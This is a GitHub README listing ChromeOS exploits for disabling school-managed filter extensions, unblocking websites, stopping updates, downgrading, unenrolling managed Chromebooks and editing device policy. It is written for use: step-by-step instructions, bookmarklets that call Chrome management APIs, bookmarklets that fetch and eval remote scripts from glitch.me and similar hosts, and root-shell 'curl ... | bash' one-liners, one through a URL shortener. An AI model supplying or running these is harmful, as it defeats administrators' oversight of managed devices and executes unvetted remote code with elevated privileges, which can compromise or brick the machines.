# EXT-REMOVER
This is a curated list of exploits for ChromeOS. It started with LTBEEF, and now there is more!
Many of these exploits can destroy your computer if misused. So PLEASE, PLEASE make sure you follow these instructions very carefully!
If you need help ask it <a href="https://github.com/3kh0/ext-remover/discussions">here</a>

Please use these only when you have permission, I (3kh0) do not condone the use of any exploits for illegal purposes!
  
**ATTENTION ALL SYS ADMINS!!!**

go away pls

<img width="250px" src="https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png">  
Image Credit: LittleMissNyan

<details>
<summary><b>LTMEAT</b> Disable extensions</summary>

**L**iterally **T**he **M**eatiest **E**xploit of **A**ll **T**ime

From [ltmeat.bypassi.com](https://ltmeat.bypassi.com), if you are interested in how this exploit works, check out that website.

1. Find a page belonging to the extension you want to disable. `chrome://extensions`, `chrome://extensions-internals`, and `chrome://process-internals` are all good places to find your extension's ID (a 32-character lowercase string). You can also do a simple Google search. Once you have your ID, substitute it into the hostname in the URL below:

```
chrome-extension://extensionidhereblahblah/manifest.json
```

For some filters like Securly, the block screen is already an extension page. 

2. Bookmark the extension page (bookmark A) if you wish. Then, bookmark `chrome://kill` (B) and `chrome://hang` (C). 
3. On the extension page (A), click the `chrome://kill` bookmark (B). The page should crash. You should already have the next step prepared. 
4. Instantly start spamming `chrome://hang` (bookmark C) and quickly reload the page while spamming (ideally with the refresh key on your keyboard or `ctrl`+`R`). You should have reloaded within one or two seconds of killing the page. 

If the extension page (bookmark A) no longer loads, then LTMEAT worked! You can close your tabs, and the extension will be dead. If nothing loads, you probably reloaded too late or spammed too slowly. This isn't rocket science! Restart your computer to revert back to normal. 

Exploit made by [Bypassi#7037](https://buymeacoffee.com/bypassi), [further reading](https://ltmeat.bypassi.com)

### "Help me! I'm an idiot!"

I had far too much faith in society when making this page. Some of you skids out there are really, really stupid and also can't read. So here are the answers to some commonly asked questions. 

**How do I get an extension ID?**

Okay, fair. Extension IDs are leaked in a couple of places. Generally, the best way to get them is to go to extension settings and copy the URL query value.

**It says blocked by client?**

That's the message you get when you try to visit a page belonging to an extension that doesn't exist. The error message (`ERR_BLOCKED_BY_CLIENT`) is highly misleading. Nobody blocked it--you need to find the correct extension ID (see above).

If you got this because you tried to visit the `extension_id_here_please` example URL, you should be extremely ashamed of yourself. Please change and grow as a person. 

**I don't have a bookmarks bar!!!!**

First, try running ctrl+shift+B. If that doesn't work, go to `chrome://settings` and turn on the "home button" feature, then set it to `chrome://hang`. A home icon should appear to the right of your refresh icon in the top left. Use that instead of bookmark C.

There is a version where you don't need bookmarklets, but I am currently gatekeeping it (L). Check this site daily to see if new alternate instructions have been posted. 

**I disabled an extension, but now I can't load websites!**

If you just read the write-up, you'd know that this would happen if the extension's background page loaded and its listeners were already initialized before you used `chrome://hang`. You can double-check whether the extension is listening using `chrome://extensions-internals`, assuming you have a few brain cells in your head.

Anyway, no listeners mean you were too slow. Either you waited more than three seconds between bookmark B and reloading the page, or you needed to be spamming bookmark C faster. The most reliable fix is to restart your computer and try again. Try to match the pace of the gif below: (note the reload) 

![image](https://ltmeat.bypassi.com/img/abc.gif)

**The bookmarks don't do anything when I click them!**

Might be admin-blocked. Either be smart enough to figure out another way or check this site daily to see if new alternate instructions have been posted.

**I disabled the extension. Why is some stuff still blocked?**

I have bad news for you... not all filters are Chrome Extensions. Again, make sure the extension pages (like bookmark A) are frozen before you assume that your skiddy self successfully did the exploit. 

[Baby method for slow people](https://ltmeat.bypassi.com/alt/1.txt)

*Need more help? [Ask in the discussions](https://github.com/3kh0/ext-remover/discussions)*

</details>

<details>
<summary><b>Temporary LTMEAT</b> Temporarily disable extensions</summary>

**A method of using LTMEAT that does not require `chrome://` urls.
Works by using 80-150 tabs to soak up memory.**

1. Create a bookmark with the link chrome://extensions/?id=idhereidkimaskid and name it “Kill switch”.

2. Create a new bookmark folder. Name it “spam.js”. Next, paste this link into your browser: chrome-extension://idhereidkimaskid/background.js

3. Then right-click on your folder and hit “Add Page”. Press Enter.

4. Right-click on the folder again and hit “Bookmark Manager”. You should see your page. Click on it and hit Ctrl+C. Press Ctrl+V until you have 38 of them.

5. Go to a new tab and right-click your folder. Press “Open All (38)”.

6. Repeat step 3, then click on one of the tabs from this batch. Wait until the “this page is taking too long” popup appears. This will take 30-60 seconds. If it doesn’t, do chrome://restart and go back to step 2 and add 3-4 more pages to the folder.

7. Once the popup happens, right-click on one of the tabs closest to the right of the screen and hit “Duplicate”. Then, go to your “Kill switch” bookmark and look for a switch to flip, “Allow Access to File:// urls” or something. Then, click on the leftmost extension tab (one that opened from the main.js folder) and click “Close all tabs to the right”. KEEP THIS TAB OPEN!!!

Tips: Go to chrome://settings/performance and turn Memory Saver off, and in the box where it says “Keep these sites always active,” paste in the extension URL. I’ve noticed clicking on one of the tabs from the second batch seems to help with reliability.

</details>

<details>
<summary><b>Baby LTMEAT</b> Disable extensions</summary>

**Patched On Chrome Versions 115 And Above**

BABY METHOD
FOR THE TECHNOLOGICALLY CHALLENGED.

1. Follow step one of the original instructions to find a page belonging to the Chrome extension you want to disable.

2. Visit that chrome-extension://blockeridhere page, then type chrome://hang in the URL bar of that tab. It should start loading infinitely.

3. Right-click the tab and duplicate it. Don't close anything.

4. Go to the chrome://extensions page for the blocker extension you want to Disable.

5. If that page has any switch, such as "Allow access to file URLs", click that switch. If there are no clickable switches, cry in a corner or something.

The extension should now be broken, assuming you clicked the switch! Only one of the two duplicate tabs should be left standing. You can close your tabs now.

</details>

<details>
<summary><b>NEW LTMEAT</b> Disable extensions</summary>

  **If your Chromebook has received the 115 And Above patch on the stable channel, Then Here's A New Method For LTMEAT**

**Unpatched on 115 and above**

**L**iterally **T**he **M**eatiest **E**xploit of **A**ll **T**ime

1. Create a bookmark folder and paste the extension page many times. (About 800 minimum is recommended assuming your Chromebook is average school quality) It is recommended that you add the extension page at the beginning of the folder.

2. Right-click and open all in a new window.

3. Close the window with all those tabs.

4. Open the folder in a new window again, and Chrome should hang those tabs to take care of the old ones in the background that were just closed. (Equivalent to the duplicate tab step in Bypassi's method)

5. Flip the Allow access to file URLs switch in the extension settings and then you've bypassed the patch and the exploit is working.

6. Close everything, and you're good to go. If it didn't work, try adjusting the number of open tabs.


Bypassi should add this to his website as an Alternate Method # 2. With this workaround, LTMEAT can endure a longer life!

Credit to <a href="https://github.com/AshtonDavies">Ashton Davies</a> for finding this workaround

</details>

<details>
<summary><b>Baby NEW LTMEAT</b> Disable extensions</summary>

**Unpatched on 115 and above**

1. First of all, get your folder with 800+ extension page tabs and open it in a new window, for my Chromebook I used 800 extension page tabs as I feel it's the right amount for me

2. Close the newly opened Window with 800+ extension page tabs

3. Click into your folder, and open one of the extension page tabs in a new window, maybe waiting slightly longer to confirm it worked. If it loads, you did it wrong. If you see a "page unresponsive screen and a wait/exit page button," you did it right. BUT DO NOT CLICK THE EXIT PAGE BUTTON OR WAIT BUTTON. (Or if you want to do it fast, you can just see that the page always has a spinning loading circle)

4. Now go to `chrome://extensions/?id=yourblockerID`  Then scroll down and flick the "allow access to file URLs" lever and close the window with the one extension page tab remaining.

</details>

<details>
<summary><b>Print LTMEAT</b> Disable extensions with printing</summary>

1. Find your extension's largest file. This can usually be found by poking around in your extension's manifest.json.
2. Go to that page. and hit Ctrl+P. A print window should show up, with several pages in the top right.
3. Do everything you can to increase that number. Shrink down margins, change layout to landscape, anything you can. The higher you get that number, the longer the effect will last.
4. Reload. The page should start hanging.
5. Go to your extension's settings page, `chrome://extensions`.
6. Duplicate your "printing" tab, and go back to your extension's settings page.
7. Flip any switch you can find there. Usually, there'll be one titled "Allow Access to File:// [URI]s".
8. Enjoy


**Where do I find my extension's manifest.json?**
First, find your extension's ID. This is a 32-character code found on your extension's settings page, normally near or at the top. Then go to `chrome-extension://your-32-char-id-goes-here/manifest.json`

Credit to Bypassi for the original LTMEAT framework, and HUGE thanks to Swordmaster4321 for discovering that pages can be hung with printing and lots of help and suggestions.

</details>

<details>
<summary><b>LoMoH</b> Disable extensions</summary>

  **This exploit has been patched in Chrome OS 111 after being found and reported. It should have gotten admin protection sooner.**

  **About: LoMoH is a Chromebook exploit that uses the Chrome OS locked mode feature to soft disable enforced extensions (excluding Hapara Highlights if installed).**

HTML VERSION: <a href="https://tiny.cc/LoMoH">LoMoH HTML</a>

BOOKMARKLET VERSION: javascript:(function(){if (location.hostname == "docs.google.com") {document.body.innerHTML = document.body.innerHTML.replace("Locked mode is on", "Are you ready to turn off extensions?%22);%20document.body.innerHTML%20=%20document.body.innerHTML.replace(%22You%20have%20already%20opened%20and%20closed%20this%20quiz.%20Opening%20this%20quiz%20again%20will%20notify%20the%20form%20owner%20by%20email.%22,%20%22This%20will%20reload%20all%20tabs%20in%20your%20browser%22);%20var%20button%20=%20document.getElementById(%27mG61Hd%27);%20button.innerHTML%20=%20button.innerHTML.replace(%22Start%20Quiz%22,%20%22Disable%20Extensions%22);%20button.addEventListener(%27click%27,%20function(event){window.close();})}%20else%20{window.open(%22https://docs.google.com/forms/u/0/d/e/1FAIpQLSf5EYwrSUjmQhBOasMpORZy80eBCYb7qCpEwWNoRPUGyObGMA/startquiz%22);}})()

Credit to <a href="https://github.com/AshtonDavies">Ashton Davies</a> for finding this exploit

</details>

<details>
<summary><b>Dextensify</b> Disable extensions</summary>

**Dextensify is an exploit that lets you disable most admin-installed Chrome extensions from any webpage. It can be used from regular websites, HTML files, and data URLs.**

Go here and follow instructions: <a href="https://dextensify.pages.dev/main">Dextensify Main HTML</a>, or download the file here [Dextensify.html](Dextensify.html)

Made by <a href="https://ading.dev/">ading2210</a>

</details>

<details>
<summary><b>JPCMG</b> LTBEEF with Service workers</summary>

**Requirements**
- Access to `chrome://serviceworker-internals`
- Inspect element

1. Go to `chrome://serviceworker-internals`
2. Find your extension, this won't work if there's not a plugin in there.
3. Hit the start button then the `inspect` button, and execute the basic LTBEEF code
```js
chrome.management.setEnabled('<plugin id here>',false)
```
4. Profit

![image](https://user-images.githubusercontent.com/58097612/234904781-4d5ad77e-6045-435e-8aae-df12dec53013.png)

Thanks to Nyaann#3881 for this exploit
</details>

<details>
<summary><b>Corkey</b> Corrupt extensions</summary>

1. Esc+Refresh+Power and re-enroll (Enter recovery page), or you can just powerwash.
2. log into your Chromebook and immediately turn off wifi and do refresh+power to (instant restart)
3. Log back into your Chromebook with the wifi off. There should be something on the side of the connect wifi page that says log in offline or sign in as an existing user.
4. Go to chrome://extensions, turn on wifi, and wait for your school's blocking extension to appear.
5. As soon as it appears, turn off wifi and instant restart as fast as you can.
6. Log back in, go back to extensions, and wait. If it says your blocking extension could be corrupted or doesn't appear at all, then it worked (wait at least a minute with a close watch in case it comes back)
7. If it didn't work repeat from step 1.
8. If it did work, congrats you did it.

</details>

<details>
<summary><b>Extension Launcher</b> Install extensions w/o allowlist</summary>
A bookmarklet capable of installing extensions, for those without an allowlist. 

Steps: 
Go to <a href="https://extension-installer.glitch.me/code.js">here</a> bookmark the code there (Might make a DNS)
go to chrome.google.com/webstorex and use the bookmarklet, then put the icon of the extension, the id, and the name of it (This does not matter, you can put anything), then
press download, and it will work.
**Extra Notes**
- Credit to "Aka, but nice" on Discord.
- DNS will be up soon for those who have JavaScript bookmarklets blocked.
- This will not work if you have a blocklist this is only for if when you go to the web store it shows blocked

</details>

<details>
<summary><b> Point-Blank</b> Execute scripts on extension pages</summary>

This exploit allows you to execute scripts on extension pages, this is a great example of how Chromebooks are a piece of garbage.

<i>Getting started</i>
(Note: if bookmarklets are blocked you're screwed.)
1. Go to <a href="https://spot-maze-chinchilla.glitch.me/ingot.js">here</a> ([if blocked](https://raw.githubusercontent.com/3kh0/ext-remover/main/newpointblank.js)) on your school chromebook.
2. Make a bookmark with the code there.
3. Once that is done,

 If you have Securly go to <a href="https://tinyurl.com/bettergoofcurly">here</a> if it says blocked by Chrome, reload (you have to actually have Securly ofc)
 
 If you have iBoss visit <a href="https://tinyurl.com/goofboss">here</a>.
For Cisco Umbrella, visit <a href="https://tinyurl.com/goofumbrella">here</a>.
 
 If you have Blocksi go to <a href="https://tinyurl.com/goofsi">here</a>.
 
 And if you have GoGuardian (might not work), go to <a href="https://tinyurl.com/goofguardian">here</a>. 
 
 Now most of these links are a block page(this is intentional) each page should have a blue link, click the link on the page if it opens a blank page click the bookmarklet that you just made and click either hard disable or soft disable, you can also run some of the scripts and run your own code, your extension may disable javascript running on it, so running your own code may not work.
 
**Extra notes**
- I recommend doing soft disable, which only disables it until restart. 
- The launcher was made by me, but the idea was from <a href="https://bolg.glitch.me/_/point-blank/">Bypassi#7037</a>
- If your school updated GoGuardian, this exploit may not work.

</details>

<details>
<summary><b>UBoss</b> Tamper with IBoss</summary>

By the BlueHatCrew
https://dsc.gg/blue-hat-crew

This works only for iBoss, and Blocksi, If you don't have one of these, use New Point Blank.

1. Go to https://tinyurl.com/byeswamp if you have iBoss or https://tinyurl.com/blockboss if you have Blocksi.
Then bookmark the code below
```js
javascript:opener.eval(`fetch("https://rounded-boiling-flax.glitch.me/uboss.js").then(data=>{data.text().then(e=>{eval(e)})})`) && close();
```
2. Then go to the site with your blocker that was listed above.
3. Run the code. Follow the instructions there.

If it doesn't work let us know by creating a discussion, this was made in partnership with Aka, but nice#5094 and Bypassi#7037.

</details>

<details>
<summary><b>CAUB</b> Prevent Updates</summary>

This exploit keeps your Chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by Catakang#0987. Using onc files, you can convince your Chromebook that the wifi that you're connected to is pay-to-use (like a hotspot using data), and thus it will not check for updates.

![image](https://user-images.githubusercontent.com/58097612/212685932-ef9c802e-6040-42a3-be6e-10997162b7cd.png)

<i>Getting started</i>

1. Go to `chrome://network#state` (on your school-issued Chromebook of course; if this is blocked then ur kinda screwed lol).
2. Scroll to the bottom of the page; you should see a list of "favorite" wifi that you've connected to in the past.
3. Click the `+` sign next to the wifi name of each network that you commonly connect your Chromebook to.
4. The more wifis you expand, the better, but note that they have to come from the "favorites" section.
5. Use ctrl+a and ctrl+c to copy all the text on the entire network#state page.
6. Go to [caub.glitch.me](https://caub.glitch.me/).
7. Paste the copied text into the textbox below.
8. Press the `generate onc` button below the textbox.
9. Once you have downloaded the file, go to `chrome://network#general`.
10. Click on the `import ONC` button.
11. Import the newly-downloaded file.

**Extra notes**
- Your Chromebook will no longer automatically update. (as long as you are on a wifi that you used CAUB on)
- Be careful not to stay on wifi for too long without using CAUB on it, otherwise, you might update.
- We cannot guarantee that this will work on every wifi

</details>

<details>
<summary><b>Alt CAUB</b> Prevent Updates</summary>

This alt exploit keeps your Chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by <a href="https://github.com/MechaXYZ">MechaXYZ</a>. Using a Chrome flag, you can convince your Chromebook not to automatically update.

<i>Getting started</i>

1. Go to `chrome://flags#show-metered-toggle` or search "metered" in `chrome://flags` instead
2. Enable it and restart your device
3. Go to your network >> Advanced >> Show metered toggle and turn it on

**Extra notes**
- Your Chromebook will no longer automatically update.
- Chrome://flags must not be blocked by your school otherwise, this exploit will not work
- And you must be able to enable flags if it ain't blocked otherwise, this exploit won't work

</details>

<details>
<summary><b>LTBEEF</b> Disable extensions</summary>

LTBEEF is an exploit, created by Bypassi#7037, which abuses API endpoints within the Google Chrome web store. The original site created for this exploit can be found at <a href="https://ltbeef.netlify.app/">ltbeef.netlify.app</a>

<b>Please Note:</b> This exploit only works on versions below 106, and earlier versions of 102
  
**Installation**  
There are several versions of this exploit you can use, here are the 2 most common versions:
- *Bookmarklets*  
    1. To use a GUI, bookmark one of the below scripts:  
    - Ingot  
    ```js
    javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
    ```
    - Compact Cow's UI  
    ```js
    javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
    ```  
    - Compact Cow's UI (Dark)
    ```js
    javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
    ```
    2. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
    3. Flip the switches on the extensions you want to disable. Simple!  

    Photos of the GUI's:
    ![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)
    ![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)
   
- *DNS servers*  
    By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.  
      
    1. First, go to Settings > Network > Wifi > Network.
    2. Click on `Custom Name Servers`
    
    ![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)  
    
    3. Set every box there to the following ip:
    ```
    158.101.114.159
    ```
    (Hosted by The Greatest Giant#0110)  
    4. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
    5. Flip the switches on the extension you want to disable.
    6. Profit
    
</details>  

<details>
<summary><b>LTBEEF inspect</b> Using inspect to disable extensions</summary>

![image](https://user-images.githubusercontent.com/58097612/207386423-e6aa2095-d92d-44a8-a3d6-e42066bdf34e.png)

The screenshot below was performed on `108.0.5359.75` (Official Build) (64-bit) on the stable channel. This has been tested and does work but has varying levels of success, you will need access to inspect elements, more specifically, console.

1. Open this on your Chromebook: 
```
chrome-extension://gndmhdcefbhlchkhipcnnbkcmicncehk/manifest.json
``` 
Shortened link: https://tinyurl.com/i-ltbeef
2. Open inspect and navigate to the console tab.
3. Run the basic LTBEEF code such as
```js
chrome.management.setEnabled('extensionid', false)
```
Replacing `extensionid` with the ID of the extension you want to disable, e.g. the stuff after the = in the URL bar when you click the extension's "details" button in chrome://extensions

Credit to SprinkzMC#8421 (aka Bypassi) for finding this!

![image](https://user-images.githubusercontent.com/58097612/207385046-5a9f6f07-6089-4775-9183-c11bd24ba02c.png)

To re-enable just go to the Chrome web listing for the extension and click on the banner.

</details>

<details>
<summary><b>Blank3r</b> Reload extensions continuously</summary>

Point Blank is an exploit that allows you to run bookmarklets on privileged pages, such as the Chrome extensions page. This exploit was made with Point Blank as well.

The exploit code is below.
1. Bookmark this code:

```js
javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
```

And the GUI is in launcher.js

2. Navigate to `chrome://extensions`.

3. Click on an extension that YOU installed from the Chrome Web Store > Details.

4. In the URL bar, copy the string of letters and numbers after the `/?id=`.

5. Click "View in Chrome Web Store" and spam the escape key. If it loads into Chrome Webstore try again, if it is a blank screen click the bookmarklet.

5. Paste the ID of the extension into the prompt separated by commas.

If you close the tab, the exploit will stop working.

</details>

<details>
<summary><b>sh1mmer</b> Unenrollment</summary>  
sh1mmer is an exploit developed by the crew at Mercury Workshop. Credits can be found within the menu and on their site.  

Further information is now located at these links:

[Official Repository](https://github.com/CoolElectronics/sh1mmer)  
[Official Website (INSTRUCTIONS)](https://sh1mmer.me/)  
[Raw Shims Download](https://files.ultimatesrv.com/)  
[Wax4Web Shim Builder](https://build.ultimatesrv.com/)
</details>

<details>
<summary><b>Downgrading</b> Change versions</summary>  
Downgrading can be used for several exploits, to get to a version that does not have patches for certain exploits, such as LTBEEF. This is a built-in feature of ChromeOS.

![image](https://user-images.githubusercontent.com/58097612/212685863-3d6b8ce1-7caa-4735-95a8-8eb6787b227c.png)

<i>Requirements</i>
1. A USB thumb drive with at least 4GB of storage, some boards have small or bigger images, I recommend 16GB
2. A personal computer with access to downloading extensions
3. A brain
If you do not have these, you **CAN NOT** perform the exploit!

<i>Setup</i>
1. Navigate to `chrome://version` on the Chromebook you wish to downgrade and check for your board under `Platform` (ex I have a c3100 and its board is stable-channel octopus).

<img src="https://user-images.githubusercontent.com/88395302/212484378-65e6e6e3-b995-48a1-b229-3265a4993279.png">

2. Navigate to https://chrome100.dev/ , press `ctrl+f` and type in your board.
3. Find and download the Chrome version you want to your personal computer.

<i>Instlation</i>
1. Install Chromebook Recovery Utility onto your personal computer. (found at <a href="https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en">chrome.google.com/webstore/detail/Chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm</a>
2. Open the extension, click on the settings button in the top right-hand corner, and click "use local image".
3. Select the recovery image you downloaded from chrome100.
4. Plug in the USB you wish to use, and follow the prompts on the screen.
5. On your Chromebook, press esc+reload+power and follow the prompts.
6. On the checking for updates screen, press `ctrl`+`shift`+`e` to skip the "checking for updates" screen.
7. Profit.

</details>

<details>
<summary><b>E-Halcyon</b> Unenrolmlent Or Downgrade</summary>

First of all, you'll need a Linux PC or VM. WSL is not guaranteed to work

Now, you'll need to boot into SH1MMER, and press the Un-Enroll option. It won't truly unenroll you if you've received the 112 updates patching unenrollment and downgrading, but it is still a necessary step for the rest of this. If you've never used SH1MMER before or don't have an image lying around, make sure to follow all the instructions on sh1mmer.me for unenrollment before proceeding with the rest of the tutorial here

Next, you need a version 107 recovery image corresponding to your board, which you can pick up from chrome100.dev. Once you've downloaded the right image for your board and have confirmed it's for version 107, unzip it and save it to a safe place. Now open up a terminal and type in the following commands (make sure to replace /path/to/recovery/image.bin with the actual path)

```
git clone https://github.com/MercuryWorkshop/RecoMod
cd RecoMod
chmod +x recomod.sh
sudo ./recomod.sh -i /path/to/recovery/image.bin --halcyon --rw_legacy
```

The script will modify the image in place, and it can now be flashed with a standard recovery tool onto a USB of your choice.

Enable developer mode and get to the dev mode block screen similarly to how you would with SH1MMER, then plug in the USB. The recovery screen will show up, and at this point, you need to start spamming the E key on your keyboard. It will begin a 5-minute wait sequence, and near the end of the 5 minutes start spamming E again. You will only have to wait 5 minutes once, subsequent boots will have the 5-minute wait omitted

The boot splash will show, and you will enter a special menu. Use arrow keys to navigate the cursor down to "activate halcyon environment" and press enter. Then navigate down to "Install halcyon semi-tethered" and wait for it to finish. Once it's finished, go back to "activate halcyon environment" and press "Boot halcyon semi-tethered". and you will be booted into a downgraded and unenrolled ChromeOS environment.

FAQ:
How does this work?
See the writeup for more information

Can the admins see that I'm doing this?
No.

Why don't my history/cookies/etc save after a reboot?
Unfixable restriction of cryptohome. See the writeup for more information

Why is my Chromebook "Missing or damaged?"
After installing E-Halcyon, you won't be able to boot Chrome OS normally. You'll have to keep the USB around to jumpstart the booting process

Where do I report bugs?
The RecoMod GitHub

Why does it say "E mode not activated" when I try to boot halcyon?
You spammed the E key when starting at the wrong time, or not at all

Credits:
CoolElectronics - RecoMod, working switch_root, and everything else
OlyB - Insight and contributions to the RecoMod script
vk6 - Created this website

</details>

<details>
<summary><b>Extention Inactivity hack</b> Inactive Extensions</summary>

1. First, do the Esc+Refresh+Power
2. Ctrl+d then enter
3. Will give you some bullcrap about dev mode being blocked press enter then you will go to a newly restarted Chromebook
4. Next, add wifi
5. Then sign into your account
6. Immediately turn wifi off before extensions load
7. Go to `chrome://settings/signOut`
8. Click turn off sync and personalization and then turn wifi back on go to whatever site that is extension blocked.

1. Workaround for chrome://settings/signOut if patched: If the link gets patched and you no longer see the blue button, go to `chrome://settings/resetProfileSettings` and click current settings, it'll open a blank page, on that page run 
```js
javascript:opener.chrome.send("TurnOffSync");
```
2. Workaround for `chrome://settings/signOut` and `javascript:opener.chrome.send("TurnOffSync");` if both patched: Just go to `chrome://settings/syncSetup/advanced` and click 
Customize sync and then flip off the Extensions and Apps or just flip off everything except for bookmarks

Note: Before you do any of this do it at home so that way you don't have to worry about asking for the school wifi password.

</details>

<details>
<summary><b>New TUA</b> Temporarily Unblock Any Website</summary>

**Might Be Patched on 115 And Above**
  
1 go to the chrome-extension://Paste the blocker id here/manifest.json page.

2 go to a new tab page and type in the URL Website you want to unblock don´t go into that website yet just leave it inside the URL Box.

3 go back to chrome-extension://Paste the blocker id here/manifest.json now create a bookmark called E now click more and In the URL Box you put chrome://kill now save that bookmark.

4 create another bookmark called D click more In the URL Box copy and paste  javascript:(function () {window.onbeforeunload = function() { return 1; };})()    Into that URL Box and save that bookmark.

5 go back to chrome-extension://Paste the blocker id here/manifest.json page and now click bookmark B then quickly go back to the new tab page and click enter now quickly spam bookmark D like 2 or more times now there should be a pop up called do you want to close this page click cancel now boom that website is unblocked until you turn off your chromebook or until you exit out of that website then if that happen´s your gonna have to do all the steps again.

  Easier way for step 2: instead of putting the URL in the new tab box go to chrome-extension://Paste the blocker id here/manifest.json page then click Bookmark E then go to a random website then use the javascript:open('https://YOUR WEBSITE HERE?'+'i'.repeat(1)) Bookmarklet then spam Bookmark D two or more times then a pop up should appear quickly click cancel now boom all done.    Name of Bookmarklet > Unblock Website: javascript:open('https://YOUR WEBSITE HERE?'+'i'.repeat(1))

Note: Save chrome-extension://Paste the blocker id here/manifest.json as a bookmark so you don´t have to come back here and type in the URL thing.

IMPORTANT NOTE: if bookmarklets are blocked your screwed

</details>

<details>
<summary><b>Old TUA</b> Temporarily Unblock Any Website</summary>

1. Make a bookmark called tab close blocker now click more on the bottom left corner now in that URL BOX put in `javascript:(function () {window.onbeforeunload = function() { return 1; };})()`
2. Go to a new page now go into the URL BOX on the top and put https://YOUR WEBSITE HERE do not click enter yet stay in that URL BOX.
3. Do search+esc now which should open task Manager if search+esc doesn't work then click the three dots on the top right now and scroll down until you find more tools click that and find task Manager.
4. Find your blocker extension and click it now on the bottom right you should see a button called End process click it now quickly click the URL BOX on the new page and click enter now quickly spam the bookmark tab close blocker now a pop up should come up it should have to buttons cancel and leave click cancel.

IMPORTANT NOTE: You can not do this exploit if bookmarklets or the task manager is blocked.
</details>

<details>
<summary><b>Enterprise Enrollment Glitch</b> Unenroll/Bypass Enterprise Enrollment</summary>

This only works on Chrome versions 115 and above, and your school has not to have force enterprise enrollment on your school Chromebook

1. Powerwash your Chromebook

A) esc+refresh+power

B) then "ctrl"+"d" and then space or enter

2. Then add wifi
3. Now when it takes you to the enrolling screen or whatever immediately turn off wifi, then wait until it says enterprise enrollment has failed or something like that
4. There should be 2-3 buttons to use as a personal device and enroll manually and try again
5. Click use as a personal device, then add back wifi and then sign in and boom Unenrollment worked

If it doesn't work then your screwed

</details>

<details>
<summary><b>Fakemurk</b> Trick your Chromebook into being in developer mode while being enrolled in your school's profile.</summary>

**Fakemurk is a script that can run in developer mode to trick your Chromebook into being in developer mode while being enrolled in your school's profile. You can use this to disable any extension, as well as have full access to the Chrome web store and Google Play store. This provides a personal Chromebook-like experience while still being enrolled.**

Go here and follow instructions: <a href="https://docs.google.com/document/d/1Pku_CbEG9SwQtnm0I188RtpdpW8nXQhiNdMp8PN7Mik/edit?pli=1">Fakemurk Doc</a>

</details>

<details>
<summary><b>Pollen</b> Chrome OS User Policy Editor</summary>

How To Use

- Normal
  - Note: Devmode **NEEDS** to be enabled.
  - Open Crosh
  - Run `shell`
  - Run `sudo su`
  - Run `curl -Ls https://mercuryworkshop.github.io/Pollen/Pollen.sh | bash`
  - Done! It may take a few seconds for the new policy to apply. If it does not apply, press `alt+vol_up+x`.
- PollenFS (RootFS)
  - Note: Disabling RootFS **will** Soft-Brick your Chromebook when booting back into normal mode.
  - Note II: Devmode **NEEDS** to be enabled.
  - Open Crosh
  - Run `shell`
  - Run `sudo su`
  - Run `curl -Ls https://mercuryworkshop.github.io/Pollen/RootFS.sh | bash`
  - Reboot
  - Go Through Steps 1-3 Again
  - Run `curl -Ls https://mercuryworkshop.github.io/Pollen/PollenFS.sh | bash`
  - Done! Your Pollen configuration is now permanently applied!

It works by loading a custom user policy into chromeOS. (Similar to how policies on windows work.)  

Using this we can either disable RootFS permanently or temporarily to load it.  

CrOS does not have the folder to load it built-in, however, the src code is still there so we can manually create it.  

Then simply we just create the file and restart.

Credits
- Pollen Developer - Scaratek
- Discovery - Rafflesia
- Original Script Developer - OlyB
- Logo - Nitelite
- Fixed Bug - r58playz
- Added Policies - 5less-chromosones

To make your own modifications refer to the Pollen Wiki

<a href="https://github.com/MercuryWorkshop/Pollen/wiki#getting-your-policies">Pollen Modifaction Wiki</a>

Further reading:
- https://github.com/MercuryWorkshop/Pollen

</details>

<details>
<summary><b>Customized Pollen</b> Chrome OS Policy Editor Customized</summary>

**Customized Pollen for SH1mmered chrombook users.** 

The original pollen by Mercury Workshop: https://github.com/MercuryWorkshop/Pollen 

It removes all admin-installed extensions and that's kinda a problem for me so this is edited it to make it fit more for SH1mmer users

So I customized this one to edit lots of features  but to keep all admin-installed extensions

incognito mode: on (everything unblocked, idk if extensions like GoGauridan can see)

ExtensionSettings: all settings removed

HomepageLocation: chrome://newtab

NewTabPageLocation:             (left empty)

ManagedBookmarks: removed all school added bookmarks

PinnedLauncherApps: removed all force pinned apps to home bar

RestoreOnStartupURLs:   (set it so when you open a new window some schools force it to also open the school's homepage so its set back to new tab and no extra tabs)

WebAppInstallForceList: removed all force installed apps


How to run

Note: Devmode NEEDS to be enabled.
Open Crosh

Run
```
shell
sudo su
curl -Ls https://tinyurl.com/repollen | bash
```

Done! It may take a few seconds for the new policy to apply. If it does not apply, press `alt+vol_up+x`

Errors

If you have Linux enabled you will have to turn it off and turn it back on for it to work

THIS WILL RESET EVERY TIME YOU RESTART THE CHROMEBOOK SO YOU WILL NEED TO REDO THE PROCESS

</details>
  
<details>
<summary><b>Killcurly</b> Break extensions</summary>
Kill the extension by signing out.

1. Visit `chrome://settings/signOut`, the O in Out must be capitalized.
2. Press the big blue button
3. Go to `chrome://restart`
